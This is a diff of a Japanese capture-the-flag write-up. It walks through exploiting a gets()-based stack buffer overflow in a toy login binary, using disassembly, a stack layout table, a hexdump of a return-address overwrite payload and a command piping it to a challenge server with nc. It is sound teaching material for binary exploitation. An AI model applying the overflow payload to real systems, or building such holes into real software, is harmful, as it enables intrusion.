@@ -6,20 +6,15 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-
 char flag[0x20];
-
 char *gets(char *s);
-
 void setup()
 {
     FILE *f = NULL;
-
     alarm(60);
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
-
     f = fopen("flag.txt", "rt");
     if (f == NULL) {
         printf("Failed to read flag.txt\n");
@@ -28,19 +23,15 @@ void setup()
     fscanf(f, "%s", flag);
     fclose(f);
 }
-
 int main()
 {
     char id[0x20] = "";
     char password[0x20] = "";
-
     setup();
-
     printf("ID: ");
     gets(id);
     printf("Password: ");
     gets(password);
-
     if (strcmp(id, "admin") == 0 &&
         strcmp(password, flag) == 0) {
         printf("Login Succeeded\n");
@@ -51,6 +42,28 @@ int main()
 ```
 ## 関数のリターンアドレスについて
 <!-- todo -->
+```assembly
+00000000004011b6 <setup>:
+4011b6: 55 push rbp
+4011b7: 48 89 e5 mov rbp,rsp
+:
+401284: e8 c7 fd ff ff call 401050 <fclose@plt>
+401289: 90 nop
+40128a: c9 leave
+40128b: c3 ret
+:
+000000000040128c <main>:
+:
+4012d4: b8 00 00 00 00 mov eax,0x0
+4012d9: e8 d8 fe ff ff call 4011b6 <setup>
+4012de: 48 8d 3d 46 0d 00 00 lea rdi,[rip+0xd46] # 40202b <_...
+```
+以上は、setup関数の先頭と末尾、main関数のsetup関数を呼び出している部分。  
+アドレス0x4012d9の```call 4011b6```で処理が0x4011b6に移り、0x40128bのret命令で処理が0x4012deに戻る。  
+このとき、ret命令が実行された後に戻るアドレスはスタックに保存されている。  
+そのアドレスを関数のリターンアドレスという。
+
+
 ## 攻略
 今回の目的は、ソースコード44行目の```printf("The flag is: %s\n", flag);```を実行させること。  
 main関数からの戻り先のアドレスを変更することで実現する。
@@ -65,7 +78,7 @@ main関数実行時のスタックの状態
 |rdp+0x8|0x08|main関数から__libc_start_main関数へのアドレス|
 
 
-「main関数から__libc_start_main関数へのアドレス」を```printf("The flag is: %s\n", flag);```が実行されるアドレスに変更すればフラグが得られる。  
+「main関数から__libc_start_main関数へのアドレス」を```printf("The flag is: %s\n", flag);```が実行されるアドレスに変更してフラグを得る。  
 そのアドレスを探すために以下を実行する。
 ```
 objdump -d -M intel login2 > login2.txt
@@ -159,7 +172,6 @@ main関数の部分を抜き出してみてみる。
   以上の部分を見ると、setup関数、printf関数、...と呼び出されており、ソースコード中の関数呼び出しが行われていることが分かる。
   ```c
       setup();
-
     printf("ID: ");
     gets(id);
     printf("Password: ");
@@ -218,3 +230,27 @@ main関数の部分を抜き出してみてみる。
 飛ばしたいアドレスが分かったので、スタックバッファオーバーフローにより、そのアドレスの命令を実行させる。
 
 ### スタックバッファオーバーフロー
+バイナリエディタを使って、以下のファイルを作成する。
+```
+clpwn@CLPWN:~$ hexdump -Cv attack.bin
+00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
+00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
+00000020  61 61 61 61 61 61 61 61  52 13 40 00 00 00 00 00  |aaaaaaaaR.@.....|
+00000030
+```
+main関数実行時のスタックの構造が以下の通りであったので、password、id、古いrdpの値は適当な値で埋め、main関数から__libc_start_main関数へのアドレスが保存されているアドレスに、処理を飛ばしたいアドレスを入れる。リトルエンディアンに注意する。
+
+|アドレス|サイズ|内容|
+|:---|:---|:---|
+|rdp-0x40|0x20|password|
+|rdp-0x20|0x20|id|
+|rdp|0x08|古いrdpの値|
+|rdp+0x8|0x08|main関数から__libc_start_main関数へのアドレス|
+  
+作成したattack.binを入力として、login2を実行してみる。  
+```
+clpwn@CLPWN:~$ cat attack.bin | ./login2
+Failed to read flag.txt
+```
+今回は手元の環境で実行し、flag.txtファイルは存在しないためエラーが出力されたが、flag.txtを読み取る処理は実行されているため、攻撃は成功している。  
+実際のCTFなどでは、```cat attack.bin | nc localhost 10002```などとして、入力を問題サーバーに送ることでflagを得ることができる。
